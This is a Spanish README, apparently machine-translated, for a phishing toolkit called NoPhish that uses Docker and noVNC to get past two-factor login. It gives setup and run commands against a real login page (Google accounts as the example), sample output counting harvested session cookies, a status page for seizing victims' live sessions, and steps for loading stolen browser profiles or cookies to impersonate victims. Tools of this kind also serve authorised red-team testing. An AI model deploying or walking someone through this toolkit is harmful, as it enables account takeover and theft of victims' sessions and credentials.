# NoPhish
 
Otro conjunto de herramientas de phishing que proporciona una infraestructura basada en docker y noVNC. Toda la configuración se basa en el artículo inicial de [mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/) y [fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html).

Una descripción detallada de la configuración se puede encontrar aquí - [Otra herramienta de phishing](https://powerseb.github.io/posts/Another-phishing-tool/)

## Instalación

Asegúrese de que docker esté instalado y funcionando.

Instale los módulos de python requeridos:

```console
pip install lz4
```

Instale la configuración (que creará las imágenes de docker requeridas):

```console
setup.sh install
```

## Ejecución

La configuración ofrece los siguientes parámetros:

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set
         -p Additional URL parameters - if not set generic URL will be generated

```

Una ejecución básica se ve de la siguiente manera:

```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```
Durante la ejecución, la siguiente visión general proporciona un estado por URL de cuántas cookies o informaciones de sesión se han recopilado.


```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/v1/oauth2/authorize?access-token=b6f13b93-1b51-41c4-b8b4-b07932a45bd6 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v2/oauth2/authorize?access-token=fd54dbec-c057-4f46-8657-c0283e5661d9 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v3/oauth2/authorize?access-token=9d606939-b805-4c65-9e98-2624de2cd431 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v4/oauth2/authorize?access-token=84b8d725-7e87-439e-8629-53332092b68f :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```

Tenga en cuenta que la herramienta exportará todas las cookies / información de sesión incluso cuando no esté relacionada con un inicio de sesión exitoso.

Además, también puede interactuar directamente con la herramienta en la página de estado - `http(s)://%DOMAIN%:65534/status.php`. Allí tiene la posibilidad de desconectar al usuario y tomar el control directo de la sesión.

En la versión actual de la herramienta, para cada usuario se inician dos contenedores: uno para escritorios y otro para dispositivos móviles. Según el agente de usuario, el objetivo es redirigido al contenedor adecuado. La salida del contenedor móvil se nombra con una "m" al inicio (por ejemplo, mphis1-ffprofile).

## Uso de la exportación de perfil
Si está utilizando la exportación completa del perfil de FireFox, simplemente puede llamar a firefox con -profile de la siguiente manera:

En Windows:
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

En Linux:
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

Todo se restaura, incluida la última página visitada.

Tenga en cuenta que por defecto debe extraer el archivo zip o establecer el parámetro `-z` en `false`. Si se elige el formato de exportación `-e simple`, se generarán dos archivos json que pueden usarse con Cookiebro, disponible para [Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/) y [Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn).

## Limpieza

Durante la ejecución, el script puede ser terminado con `ctrl` + `c` - todos los contenedores docker en ejecución serán eliminados. Para eliminar completamente la configuración, ejecute `setup.sh cleanup`.



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-29

---